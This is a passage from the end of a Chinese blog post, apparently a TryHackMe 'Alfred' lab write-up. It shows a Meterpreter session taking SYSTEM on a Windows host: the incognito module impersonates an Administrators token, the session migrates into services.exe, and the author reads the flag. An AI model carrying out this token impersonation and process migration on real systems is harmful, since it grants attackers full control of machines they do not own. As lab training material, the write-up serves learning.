+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">meterpreter &gt; getprivs
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enabled Process <span class="nv">Privileges</span>
+</span></span><span class="line"><span class="cl"><span class="o">==========================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Name
+</span></span><span class="line"><span class="cl">----
+</span></span><span class="line"><span class="cl">SeBackupPrivilege
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege
+</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege
+</span></span><span class="line"><span class="cl">SeCreatePagefilePrivilege
+</span></span><span class="line"><span class="cl">SeCreateSymbolicLinkPrivilege
+</span></span><span class="line"><span class="cl">SeDebugPrivilege
+</span></span><span class="line"><span class="cl">SeImpersonatePrivilege
+</span></span><span class="line"><span class="cl">SeIncreaseBasePriorityPrivilege
+</span></span><span class="line"><span class="cl">SeIncreaseQuotaPrivilege
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege
+</span></span><span class="line"><span class="cl">SeLoadDriverPrivilege
+</span></span><span class="line"><span class="cl">SeManageVolumePrivilege
+</span></span><span class="line"><span class="cl">SeProfileSingleProcessPrivilege
+</span></span><span class="line"><span class="cl">SeRemoteShutdownPrivilege
+</span></span><span class="line"><span class="cl">SeRestorePrivilege
+</span></span><span class="line"><span class="cl">SeSecurityPrivilege
+</span></span><span class="line"><span class="cl">SeShutdownPrivilege
+</span></span><span class="line"><span class="cl">SeSystemEnvironmentPrivilege
+</span></span><span class="line"><span class="cl">SeSystemProfilePrivilege
+</span></span><span class="line"><span class="cl">SeSystemtimePrivilege
+</span></span><span class="line"><span class="cl">SeTakeOwnershipPrivilege
+</span></span><span class="line"><span class="cl">SeTimeZonePrivilege
+</span></span><span class="line"><span class="cl">SeUndockPrivilege
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后准备提权，加载incognito，该模块是meterpreter中的一个模块，用来模拟用户token。</p>
+<p>使用<code>list_tokens -g</code>查看token：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">meterpreter &gt; load incognito
+</span></span><span class="line"><span class="cl">Loading extension incognito...Success.
+</span></span><span class="line"><span class="cl">meterpreter &gt; list_tokens -g
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Warning: Not currently running as SYSTEM, not all tokens will be available
+</span></span><span class="line"><span class="cl">             Call rev2self <span class="k">if</span> primary process token is SYSTEM
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Delegation Tokens <span class="nv">Available</span>
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl"><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>BUILTIN<span class="se">\A</span>dministrators						--&gt; 存在administrator的token
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\U</span>sers
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>TLM Authentication
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\S</span>ERVICE
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\T</span>his Organization
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\A</span>udioEndpointBuilder
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\C</span>ertPropSvc
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\C</span>scService
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\i</span>phlpsvc
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\L</span>anmanServer
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\P</span>caSvc
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\S</span>chedule
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\S</span>ENS
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\S</span>essionEnv
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\T</span>rkWks
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\U</span>mRdpService
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\U</span>xSms
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\W</span>inmgmt
+</span></span><span class="line"><span class="cl">NT SERVICE<span class="se">\w</span>uauserv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Impersonation Tokens <span class="nv">Available</span>
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span>
+</span></span><span class="line"><span class="cl">No tokens available
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用命令<code>impersonate_token &quot;BUILTIN\Administrators&quot; </code>来获取administrator的token：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">meterpreter &gt; impersonate_token <span class="s2">&#34;BUILTIN\Administrators&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Warning: Not currently running as SYSTEM, not all tokens will be available
+</span></span><span class="line"><span class="cl">             Call rev2self <span class="k">if</span> primary process token is SYSTEM
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Delegation token available
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Successfully impersonated user NT AUTHORITY<span class="se">\S</span>YSTEM
+</span></span><span class="line"><span class="cl">meterpreter &gt; getuid
+</span></span><span class="line"><span class="cl">Server username: NT AUTHORITY<span class="se">\S</span>YSTEM
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功拿到system权限。</p>
+<p>虽然我们此时拿到了system的权限，但是此时并不是system用户。此时我们的进程是shell.exe进程，它的用户是bruce，我们只是有了一个system权限的token。那么下一步，我们可以考虑把权限从当前的shell.exe进程迁移到进程用户是administrator的进程上去，这样我们就有了进程用户administrator的权限。</p>
+<p>常用的一个进程是service.exe，进程用户是system：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">meterpreter &gt; ps
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Process <span class="nv">List</span>
+</span></span><span class="line"><span class="cl"><span class="o">============</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> PID   PPID  Name                  Arch  Session  User                          Path
+</span></span><span class="line"><span class="cl"> ---   ----  ----                  ----  -------  ----                          ----
+</span></span><span class="line"><span class="cl"> <span class="m">0</span>     <span class="m">0</span>     <span class="o">[</span>System Process<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> <span class="m">4</span>     <span class="m">0</span>     System                x64   <span class="m">0</span>
+</span></span><span class="line"><span class="cl"> <span class="m">396</span>   <span class="m">4</span>     smss.exe              x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>mss.exe
+</span></span><span class="line"><span class="cl">... ...
+</span></span><span class="line"><span class="cl"> <span class="m">608</span>   <span class="m">564</span>   winlogon.exe          x64   <span class="m">1</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\w</span>inlogon.exe
+</span></span><span class="line"><span class="cl"> <span class="m">668</span>   <span class="m">580</span>   services.exe          x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>ervices.exe		--&gt; 进程的所有者是system
+</span></span><span class="line"><span class="cl"> <span class="m">676</span>   <span class="m">580</span>   lsass.exe             x64   <span class="m">0</span>        NT AUTHORITY<span class="se">\S</span>YSTEM           C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\l</span>sass.exe
+</span></span><span class="line"><span class="cl"> ... ...
+</span></span><span class="line"><span class="cl">  <span class="m">2280</span>  <span class="m">1528</span>  shell.exe             x86   <span class="m">0</span>        alfred<span class="se">\b</span>ruce                  C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\J</span>enkins<span class="se">\w</span>orkspace<span class="se">\s</span>hell<span class="se">\s</span>hell.exe  --&gt; 进程的所有者是bruce
+</span></span><span class="line"><span class="cl"> ... ...
+</span></span><span class="line"><span class="cl"> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接使用<code>migrate</code>命令进行迁移即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">meterpreter &gt; migrate <span class="m">668</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Migrating from <span class="m">2280</span> to 668...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Migration completed successfully.
+</span></span><span class="line"><span class="cl">meterpreter &gt; getuid
+</span></span><span class="line"><span class="cl">Server username: NT AUTHORITY<span class="se">\S</span>YSTEM
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>读取flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig&gt;type root.txt
+</span></span><span class="line"><span class="cl"><span class="nb">type</span> root.txt
+</span></span><span class="line"><span class="cl">dff0f748678f280250f25a45b8046b4a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="总结">总结</h2>
+<p>整体来说常规思路，目的就是熟悉jenkins这个软件，至于后续的提权什么的，属于常规思路。</p>
+<p>扫 -&gt; 弱口令 -&gt; 功能利用 -&gt; 提权</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-01-05</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://www.v4ler1an.com/2024/01/thm-alfred/" data-title="TryHackMe -- Alfred" data-via="@YaoyaoShaw" data-hashtags="THM"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://www.v4ler1an.com/2024/01/thm-alfred/" data-hashtag="THM"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://www.v4ler1an.com/2024/01/thm-alfred/" data-title="TryHackMe -- Alfred"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://www.v4ler1an.com/2024/01/thm-alfred/" data-title="TryHackMe -- Alfred"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.v4ler1an.com/2024/01/thm-alfred/" data-title="TryHackMe -- Alfred"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/thm/">THM</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2024/01/thm-steal_mountain/" class="prev" rel="prev" title="TryHackMe -- Steal Mountain"><i class="fas fa-angle-left fa-fw"></i>TryHackMe -- Steal Mountain</a>
+            <a href="/2024/01/cobalt_strike_basic_no.1/" class="next" rel="next" title="Cobalt Strike Basic No.1 -- Basic and Infrastructure Management">Cobalt Strike Basic No.1 -- Basic and Infrastructure Management<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Something just like this.</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.v4ler1an.com" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"OGG2bwJUUrIOs4sAfU87yE6d-gzGzoHsz","appKey":"vOzsADf7YdkMoNXlgShAFepl","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"人世纷乱，出入平安。","recordIP":true,"visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
